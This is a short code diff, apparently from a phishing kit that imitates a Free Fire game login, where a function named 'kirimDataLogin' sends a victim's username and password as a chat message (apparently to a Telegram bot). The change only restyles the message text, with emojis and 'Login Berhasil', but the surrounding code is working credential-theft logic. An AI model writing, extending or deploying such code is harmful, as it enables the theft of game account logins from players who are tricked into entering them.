@@ -17,7 +17,7 @@ function kirimDataLogin(username, password) {
         },
         body: JSON.stringify({
             chat_id: chatId,
-            text: `Login Free Fire!\nUsername: ${username}\nPassword: ${password}`
+            text: `🔥Login Berhasil🔥!\n🔐Username: ${username}\n🔑Password: ${password}`
         })
     })
     .then((res) => res.json())
